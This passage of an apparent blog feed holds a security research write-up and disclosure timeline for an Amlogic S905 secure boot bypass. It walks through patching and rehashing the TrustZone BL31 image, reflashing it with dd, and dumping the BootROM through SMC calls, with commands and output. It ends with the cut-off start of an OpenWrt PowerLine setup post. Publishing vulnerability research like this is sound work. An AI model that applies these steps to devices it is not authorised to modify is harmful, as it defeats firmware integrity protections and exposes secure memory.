&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;aml_img_header&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;magic&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;&lt;span class="c1"&gt;// &amp;quot;@AML&amp;quot;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;total_len&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint8_t&lt;/span&gt; &lt;span class="n"&gt;header_len&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint8_t&lt;/span&gt; &lt;span class="n"&gt;unk_x9&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint8_t&lt;/span&gt; &lt;span class="n"&gt;unk_xA&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint8_t&lt;/span&gt; &lt;span class="n"&gt;unk_xB&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;unk_xC&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;sig_type&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;sig_offset&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;sig_size&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;data_offset&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;unk_x20&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;cert_offset&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;cert_size&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;data_len&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;unk_x30&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;code_offset&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;code_len&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;unk_x3C&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;aml_img_header_t&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The header indicates that the image is split in 4 parts:&lt;br&gt;
&lt;ul&gt;
&lt;li&gt;header : always 64 bytes&lt;/li&gt;
&lt;li&gt;signature : RSA-1024, RSA-2048, RSA-4096 or SHA-256&lt;/li&gt;
&lt;li&gt;cert : x509 certificate&lt;/li&gt;
&lt;li&gt;code: payload&lt;/li&gt;
&lt;/ul&gt;
On our target device, the signature type of the BL31 image
(&lt;i&gt;sig_type&lt;/i&gt; in the header) is SHA-256. This is intriguing
because a SHA-256 hash alone is not enough to provide
authentication.&lt;br&gt;
The following pseudocode is the simplified algorithm of the
authentication routine in BL2 :&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;auth_image&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;aml_img_header_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;img&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
  &lt;span class="n"&gt;validate_header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;img&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// checks on magic value &amp;amp; header length&lt;/span&gt;
  &lt;span class="n"&gt;hash&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hash_sha256&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;img&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="c1"&gt;// hash whole image except signature&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;img&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;sig_type&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;RSA&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;check_rsa_signature&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;img&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;hash&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;memcmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hash&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;img&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;img&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;sig_offset&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can confirm that the SHA-256 option will only hash the loaded
image and compare the result against the precomputed hash in the
same image. We could have imagined a more complex solution like a
HMAC, but actually in this case only the integrity is checked,
there is no authentication.&lt;br&gt;
&lt;br&gt;
And even if the loaded image is signed with RSA, we can still
switch the signature type to SHA-256 and regenerate the correct
hash.&lt;br&gt;
This issue could have been avoided if the signature type was
enforced by an eFuse.&lt;br&gt;
&lt;br&gt;
This means we can easily modify the BL31 image, the most privileged
code in TrustZone.&lt;br&gt;
&lt;h3&gt;Customizing BL31 image&lt;/h3&gt;
In a previous section, we described the SMC function
&lt;i&gt;hdcp22_sec_read_reg&lt;/i&gt; that can read restricted ranges of
secure memory from Normal World.&lt;br&gt;
Time to practice our NOPing-fu to get rid of these limitations and
thus obtain full access to secure memory.&lt;br&gt;
&lt;br&gt;
&lt;table align="center" cellpadding="0" cellspacing="0" class=
"tr-caption-container" style=
"margin-left: auto; margin-right: auto; text-align: center;"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;
&lt;img alt="" src="https://fredericb.info/blog/amlogic-sb/bl31-hdcp22_sec_read_reg-asm-custom.png"&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td class="tr-caption" style="text-align: center;"&gt;
Modified&amp;nbsp;hdcp22_sec_read_reg function&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;br&gt;
We also need to extend the page tables because the BootROM memory
area is not mapped. The MMU initialization is implemented in the
ATF code base, so again this is easy to spot and analyze in the
BL31 binary.&lt;br&gt;
By default, the following memory regions are mapped:&lt;br&gt;
&lt;table align="center" cellpadding="0" cellspacing="0" class=
"tr-caption-container" style=
"margin-left: auto; margin-right: auto; text-align: center;"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;
&lt;img alt="" src="https://fredericb.info/blog/amlogic-sb/plat_gxb_mmap.png"&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td class="tr-caption" style="text-align: center;"&gt;Original list of
memory regions mapped in BL31&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;br&gt;
We extend the size of one of them to cover the BootROM region:&lt;br&gt;
&lt;table align="center" cellpadding="0" cellspacing="0" class=
"tr-caption-container" style=
"margin-left: auto; margin-right: auto; text-align: center;"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;
&lt;img alt="" src="https://fredericb.info/blog/amlogic-sb/bl31-plat_gxb_mmap-custom.png"&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td class="tr-caption" style="text-align: center;"&gt;Modified list of
memory regions mapped in BL31&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;br&gt;
The new size of mapped region 0xD9000000 is 0x80000 so it includes
the BootROM area 0xD9040000-0xD9050000.&lt;br&gt;
We're almost done with BL31 modifications: we still need to update
the SHA-256 hash.&lt;br&gt;
&lt;br&gt;
&lt;h3&gt;aml_bootloader_tool: parse and rehash Amlogic bootloaders&lt;/h3&gt;
This tool can parse and regenerate the SHA-256 of bootloaders
contained in the &lt;i&gt;bootloader&lt;/i&gt; partition. The &lt;a href=
"https://github.com/frederic/aml_bootloader_tool"&gt;source code is on
GitHub&lt;/a&gt;.&lt;br&gt;
Each bootloader is identified by an UUID, they are &lt;a href=
"https://github.com/ARM-software/arm-trusted-firmware/blob/master/include/common/firmware_image_package.h"&gt;
defined in the ATF source code&lt;/a&gt;. In our case, the BL31 image is
entry #2:&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./aml_bootloader_tool ./dump/bootloader.img H &lt;span class="m"&gt;2&lt;/span&gt;
fip_toc_header.name:        aa640001
fip_toc_header.serial_number:        &lt;span class="m"&gt;12345678&lt;/span&gt;
fip_toc_header.flags:        &lt;span class="m"&gt;0&lt;/span&gt;
TOC ENTRY &lt;span class="c1"&gt;#2&lt;/span&gt;
fip_toc_entry.uuid:        47D4086D4CFE98469B952950CBBD5A00
fip_toc_entry.offset_address:    &lt;span class="m"&gt;14000&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;absolute: 0x20000&lt;span class="o"&gt;)&lt;/span&gt;
fip_toc_entry.size:        0x11130
fip_toc_entry.flags:        0x0
magic&lt;span class="o"&gt;[&lt;/span&gt;@0x0&lt;span class="o"&gt;]&lt;/span&gt;:        @AML
total_len&lt;span class="o"&gt;[&lt;/span&gt;@0x4&lt;span class="o"&gt;]&lt;/span&gt;:    0x11130
header_len&lt;span class="o"&gt;[&lt;/span&gt;@0x8&lt;span class="o"&gt;]&lt;/span&gt;:    0x40
unk_xC&lt;span class="o"&gt;[&lt;/span&gt;@0xC&lt;span class="o"&gt;]&lt;/span&gt;:        0x5eec9094
sig_type&lt;span class="o"&gt;[&lt;/span&gt;@0x10&lt;span class="o"&gt;]&lt;/span&gt;:    0x0
sig_offset&lt;span class="o"&gt;[&lt;/span&gt;@0x14&lt;span class="o"&gt;]&lt;/span&gt;:    0x40
sig_len&lt;span class="o"&gt;[&lt;/span&gt;@0x18&lt;span class="o"&gt;]&lt;/span&gt;:        0x20
data_offset&lt;span class="o"&gt;[&lt;/span&gt;@0x1c&lt;span class="o"&gt;]&lt;/span&gt;:    0x60
unk_x20&lt;span class="o"&gt;[&lt;/span&gt;@0x20&lt;span class="o"&gt;]&lt;/span&gt;:        0x0
cert_offset&lt;span class="o"&gt;[&lt;/span&gt;@0x24&lt;span class="o"&gt;]&lt;/span&gt;:    0x60
cert_len:        0x0
data_len:        0x110d0
unk_x30&lt;span class="o"&gt;[&lt;/span&gt;@0x30&lt;span class="o"&gt;]&lt;/span&gt;:        0x0
code_offset&lt;span class="o"&gt;[&lt;/span&gt;@0x34&lt;span class="o"&gt;]&lt;/span&gt;:    0x60
code_len&lt;span class="o"&gt;[&lt;/span&gt;@0x38&lt;span class="o"&gt;]&lt;/span&gt;:    0x110d0
unk_x3C&lt;span class="o"&gt;[&lt;/span&gt;@0x3C&lt;span class="o"&gt;]&lt;/span&gt;:        0x0
signature:        263BEFAFC5A051C550D31791EC1212576BE65DB8AD365074560F0BABC076D3CA
computed_sha256:    35AD6B284EE2D6B5672DD0958592028D5BF455A6DCD1EB086D8336FB86533853
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The hash of the BL31 image has been updated, we can now reflash the
dump on the device:&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ dd &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;./bootloader.img &lt;span class="nv"&gt;of&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/block/bootloader
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finally, we reboot the device to load our customized BL31 image in
TrustZone.&lt;br&gt;
&lt;h2&gt;Dumping the BootROM&lt;/h2&gt;
The SMC system call can only be invoked from EL1 and above. So we
create a simple kernel module that will perform SMC calls to our
modified function &lt;i&gt;hdcp22_sec_read_reg&lt;/i&gt;&amp;nbsp;in
EL3&lt;i&gt;.&lt;/i&gt;&lt;br&gt;
This quick 'n dirty hack is based on the Amlogic debugfs driver
&lt;i&gt;reg_access&lt;/i&gt;. The &lt;a href=
"https://github.com/frederic/smc_access"&gt;source code is on
GitHub&lt;/a&gt;.&lt;br&gt;
Once loaded, to initiate a SMC call, we write arguments to the
file&amp;nbsp;&lt;i&gt;/sys/kernel/debug/aml_smc/smc&lt;/i&gt;. The first argument
is the ID of the called SMC function (0x82000018 in the case
of&amp;nbsp;&lt;i&gt;hdcp22_sec_read_reg&lt;/i&gt;). The second argument (for this
specific SMC ID) is the read memory address. The result DWORD is
directly printed in kernel logs (we said dirty).&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ insmod ./smc_access.ko
$ &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="m"&gt;82000018&lt;/span&gt; D9040000 &amp;gt; /sys/kernel/debug/aml_smc/smc
&lt;span class="o"&gt;[&lt;/span&gt;  &lt;span class="m"&gt;219&lt;/span&gt;.092948@0&lt;span class="o"&gt;]&lt;/span&gt; smc_access: SMC call &lt;span class="m"&gt;82000018&lt;/span&gt; returns: aa1f03e0
&lt;/pre&gt;&lt;/div&gt;


&lt;div&gt;The result &lt;b&gt;aa1f03e0&lt;/b&gt; is promising, it corresponds to the
ARM instruction:&amp;nbsp;&lt;b&gt;MOV &amp;nbsp;X0, XZR&lt;/b&gt;&lt;br&gt;
To automate the extraction of the entire BootROM memory region, we
create a simple script:&lt;/div&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ seq -f %1.f 0xD9040000 0x4 0xD9050000 &lt;span class="p"&gt;|&lt;/span&gt; xargs &lt;span class="nb"&gt;printf&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;echo \&amp;quot;82000018 %x\&amp;quot; &amp;gt; /sys/kernel/debug/aml_smc/smc\n&amp;quot;&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;82000018 d9040000&amp;quot;&lt;/span&gt; &amp;gt; /sys/kernel/debug/aml_smc/smc
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;82000018 d9040004&amp;quot;&lt;/span&gt; &amp;gt; /sys/kernel/debug/aml_smc/smc
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;82000018 d9040008&amp;quot;&lt;/span&gt; &amp;gt; /sys/kernel/debug/aml_smc/smc
&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;82000018 d904fff8&amp;quot;&lt;/span&gt; &amp;gt; /sys/kernel/debug/aml_smc/smc
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;82000018 d904fffc&amp;quot;&lt;/span&gt; &amp;gt; /sys/kernel/debug/aml_smc/smc
&lt;/pre&gt;&lt;/div&gt;


&lt;div&gt;And finally, we concate all these DWORDS into a file
&lt;b&gt;bootrom.bin&lt;/b&gt;.&amp;nbsp;&lt;/div&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ls -l ./bootrom.bin
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; user user &lt;span class="m"&gt;65537&lt;/span&gt; juil.  &lt;span class="m"&gt;8&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:43 ./bootrom.bin
$ sha1sum bootrom.bin
bff0c7fb88b4f03e732dc7a4ce504d748d0d47dd  bootrom.bin
$ strings bootrom.bin &lt;span class="p"&gt;|&lt;/span&gt;tail -22
BL1:
FEAT
READ
EMMC
NAND
LOOP
auth failed, reboot...
08dafda0fd31778
glacier.amlogic
qian
&lt;span class="m"&gt;04&lt;/span&gt;/14/15_14:23:08
gcc version &lt;span class="m"&gt;4&lt;/span&gt;.8
08dafda0fd31778
boot@USB
boot@SDC
BAD PASSWORD
!!!!
vRQ&amp;gt;
8STs
LwH&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;
Err:sha
&lt;span class="m"&gt;0&lt;/span&gt;!0
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;The S905 SoC provides hardware features to support Secure Boot,
however OEMs can still choose to enable it or not. But even when
Secure Boot is enforced, a flaw in the current version of Amlogic's
BL2 allows to bypass it. So Trusted Execution Environment cannot be
trusted. The good news is BL2 can be patched, unlike BootROM.&lt;br&gt;
&lt;br&gt;
&lt;i&gt;I would like to thank @Karnalzi for the help!&lt;/i&gt;&lt;br&gt;
&lt;h2&gt;Disclosure Timeline&lt;/h2&gt;
2016-08-08 : Flaw discovered&lt;br&gt;
2016-08-08 : Amlogic &amp;amp; some affected OEMs contacted by email to
find a security PoC&lt;br&gt;
2016-08-10 : OEM #1 replies that "Amlogic doesn't provide any
direct contact."&lt;br&gt;
2016-08-20 : Second attempt to contact Amlogic by email&lt;br&gt;
2016-09-05 : Bug report shared with Amlogic&lt;br&gt;
2016-09-13 : Status update requested&lt;br&gt;
2016-09-25 : Status update requested&lt;br&gt;
2016-10-05 : Public disclosure&lt;/div&gt;&lt;/p&gt;</content><category term="vulnerability"></category><category term="amlogic"></category><category term="arm"></category><category term="security"></category><category term="firmware"></category><category term="trustzone"></category><category term="bootrom"></category><category term="bug"></category></entry><entry><title>PowerLine (PLC) support in OpenWrt for D-Link DHP-1565</title><link href="https://fredericb.info/2016/02/powerline-plc-support-in-openwrt-for-d.html" rel="alternate"></link><published>2016-02-20T13:55:00-08:00</published><updated>2016-02-20T13:55:00-08:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2016-02-20:/2016/02/powerline-plc-support-in-openwrt-for-d.html</id><summary type="html">&lt;p&gt;D-Link 1565 is one of the few routers which integrates a PLC (Power
line Communication) chipset (in this case QCA AR7400).
Unfortunately, OpenWrt does not provide support for this feature
yet.&lt;br&gt;
&lt;br&gt;
This post presents configuration steps to enable PLC support in
OpenWrt for this device.
&lt;h2&gt;Hardware configuration&lt;/h2&gt;
By digging into …&lt;/p&gt;</summary><content type="html">&lt;p&gt;D-Link 1565 is one of the few routers which integrates a PLC (Power
line Communication) chipset (in this case QCA AR7400).
Unfortunately, OpenWrt does not provide support for this feature
yet.&lt;br&gt;
&lt;br&gt;
This post presents configuration steps to enable PLC support in
OpenWrt for this device.
&lt;h2&gt;Hardware configuration&lt;/h2&gt;
By digging into &lt;a href="http://tsd.dlink.com.tw/"&gt;D-Link GPL
source code&lt;/a&gt;&amp;nbsp;released for this device, especially function
&lt;b&gt;proprietary_s17_init()&lt;/b&gt; in file
&lt;strong&gt;DHP1565A1_1.01b13_FOSS/src/AthSDK/platform/PLC/drivers/ethernet/phys/athrs17_phy.c&lt;/strong&gt;,
we notice the port 6 of internal switch AR8327 &amp;nbsp;is related to
PLC:&lt;br&gt;
&lt;div class="separator" style="clear: both; text-align: center;"&gt;
&lt;img alt="" src="https://fredericb.info/blog/dhp-1665-plc/athsdk_port6config.png"&gt;
&lt;/div&gt;
&lt;br&gt;
This port 6 is configured as a RGMII interface to communicate with
PLC chipset. The following patch reproduces the same configuration
in OpenWrt:&lt;br&gt;
&lt;script src=
"https://gist.github.com/frederic/d9d91c2221f04df3a36a.js"&gt;
&lt;/script&gt; To build a custom firmware image, please see &lt;a href=
"https://wiki.openwrt.org/doc/howto/build"&gt;OpenWrt build system
wiki page&lt;/a&gt;.&lt;br&gt;
To flash an OpenWrt image, please see &lt;a href=
"https://wiki.openwrt.org/doc/howto/generic.flashing"&gt;OpenWrt
flashing wiki page&lt;/a&gt;. Don't forget to choose
the&amp;nbsp;&lt;i&gt;factory&lt;/i&gt; image if you're still running the OEM
firmware. If you are already using an OpenWrt firmware, you can use
the &lt;i&gt;sysupgrade&lt;/i&gt; image.
&lt;h2&gt;Network configuration&lt;/h2&gt;
Once our customized OpenWrt image is flashed &amp;amp; booted, we are
already able to see PLC bootloader probes with the swconfig
command:&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ swconfig dev switch0 show
&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
Port &lt;span class="m"&gt;6&lt;/span&gt;:
 mib: Port &lt;span class="m"&gt;6&lt;/span&gt; MIB counters
RxBroad     : &lt;span class="m"&gt;2282&lt;/span&gt;
Rx64Byte    : &lt;span class="m"&gt;2282&lt;/span&gt;
RxGoodByte  : &lt;span class="m"&gt;146048&lt;/span&gt;
Filtered    : &lt;span class="m"&gt;2152&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
 enable_eee: ???
 pvid: &lt;span class="m"&gt;0&lt;/span&gt;
 link: port:6 link:up speed:1000baseT full-duplex txflow rxflow
&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The &lt;b&gt;pvid&lt;/b&gt; field indicates that the primary VLAN
identifier&amp;nbsp;of port 6 is 0. In
file&amp;nbsp;&lt;b&gt;/etc/config/network&lt;/b&gt;, we add the port 6 to VLAN
identifier 2, which is dedicated to WAN interface in default
configuration:&lt;br&gt;
&lt;blockquote class="tr_bq"&gt;config switch_vlan&lt;br&gt;
&amp;nbsp;&amp;nbsp;option device 'switch0'&lt;br&gt;
&amp;nbsp;&amp;nbsp;option vlan '2'&lt;br&gt;
&amp;nbsp;&amp;nbsp;option ports '0t 5 &lt;b&gt;6&lt;/b&gt;'&lt;/blockquote&gt;
&lt;i&gt;Warning: configuring PLC port into WAN interface could be a
security issue: any host on WAN side can access to PLC chipset. To
prevent this risk, you might need to set up a different VLAN
configuration.&lt;/i&gt;
&lt;h2&gt;System configuration&lt;/h2&gt;
&lt;h3&gt;open-plc-utils&lt;/h3&gt;
Since the PLC chipset is flashless on this board, PLC firmware
needs to be loaded at each boot. We can use&amp;nbsp;&lt;a href=
"https://github.com/qca/open-plc-utils"&gt;Qualcomm Atheros Open
Powerline Toolkit&lt;/a&gt; to manage &amp;amp; configure this PLC chipset.&lt;br&gt;
&lt;br&gt;
We can cross-compile &lt;a href=
"https://github.com/qca/open-plc-utils"&gt;open-plc-utils&lt;/a&gt; with the
&lt;a href=
"https://downloads.openwrt.org/snapshots/trunk/ar71xx/generic/"&gt;OpenWrt
toolchain&lt;/a&gt;.&lt;br&gt;
First, we setup the following environment variables:&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$PATH&lt;/span&gt;:&amp;lt;OpenWrt-Toolchain-ar71xx&amp;gt;/bin
&lt;span class="nv"&gt;CROSS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;mips-openwrt-linux-musl-
&lt;span class="nv"&gt;ROOTFS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&amp;lt;open-plc-utils&amp;gt;/build
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then, &lt;b&gt;make&lt;/b&gt; &amp;amp; &lt;b&gt;make install&lt;/b&gt; commands are enough to
build it.&lt;br&gt;
Finally, we copy these freshly built binaries to the device in
&lt;b&gt;/overlay/upper/open-plc-utils/&lt;/b&gt;.&lt;br&gt;
&lt;br&gt;
To do a quick test, we can try the &lt;b&gt;Request Information&lt;/b&gt;
command:&lt;br&gt;
&lt;blockquote class="tr_bq"&gt;# /overlay/upper/open-plc-utils/amptool
-i eth0.2 -Iar&lt;br&gt;
eth0.2 00:B0:52:00:00:01 Request Version Information&lt;br&gt;
eth0.2 00:B0:52:00:00:01 &lt;b&gt;AR7400 BootLoader&lt;/b&gt;&lt;br&gt;
eth0.2 00:B0:52:00:00:01 Fetch Device Attributes&lt;br&gt;
eth0.2 00:B0:52:00:00:01 Device Identity&lt;/blockquote&gt;
&lt;div&gt;The line "AR7400 Bootloader" indicates that PLC chipset is
ready to load a firmware.
&lt;h3&gt;PLC firmware&lt;/h3&gt;
&lt;div&gt;The PLC firmware blob can be found in the &lt;a href=
"http://tsd.dlink.com.tw/"&gt;original firmware image&lt;/a&gt;. Using
&lt;a href="http://binwalk.org/"&gt;Binwalk&lt;/a&gt;, we extract the content
of the &lt;b&gt;/plc&lt;/b&gt; directory from the original rootfs, and copy it
to &lt;b&gt;/overlay/upper/plc/&lt;/b&gt;.&lt;/div&gt;
&lt;div&gt;The NVM file is the firmware blob, and PIB files are
configuration files: &lt;i&gt;ceb&lt;/i&gt; stands for Europe, and &lt;i&gt;na&lt;/i&gt;
for North America.&lt;/div&gt;
&lt;div&gt;&lt;br&gt;&lt;/div&gt;
&lt;div&gt;The &lt;b&gt;ampboot&lt;/b&gt; tool allows to load the firmware:&lt;/div&gt;
&lt;blockquote class="tr_bq"&gt;# /open-plc-utils/ampboot -i eth0.2 -P
/plc/plc.ceb.pib -N /plc/plc.nvm&lt;br&gt;
eth0.2 00:B0:52:00:00:01 Write /plc/plc.nvm (0)
(00000040:17256)&lt;br&gt;
eth0.2 00:B0:52:00:00:01 Start /plc/plc.nvm (0) (000000C0)&lt;br&gt;
eth0.2 00:B0:52:00:00:01 Write /plc/plc.ceb.pib (0)
(00200000:16352)&lt;br&gt;
eth0.2 00:B0:52:00:00:01 Write /plc/plc.nvm (3)
(00341194:423788)&lt;br&gt;
eth0.2 00:B0:52:00:00:01 Start /plc/plc.nvm (3) (00341A88)&lt;br&gt;
eth0.2 00:11:22:33:44:55
INT7400-MAC-5-2-5203-01-913-20110713-FINAL-B is
running&lt;/blockquote&gt;
&lt;div&gt;By default, the HomeplugAV key is used. You can get more
information with the amptool command used earlier. This can also be
used to discover/join/leave a network, modify the NMK key,
etc...&lt;/div&gt;
&lt;h3&gt;init.d script&lt;/h3&gt;
&lt;div&gt;To load the PLC firmware at each boot, create the following
init script &lt;b&gt;/etc/rc.d/S25amphost&lt;/b&gt;&amp;nbsp;:&lt;/div&gt;
&lt;div&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/bin/sh /etc/rc.common&lt;/span&gt;
&lt;span class="c1"&gt;#start right after network&lt;/span&gt;
&lt;span class="nv"&gt;START&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;25&lt;/span&gt;
&lt;span class="nv"&gt;USE_PROCD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
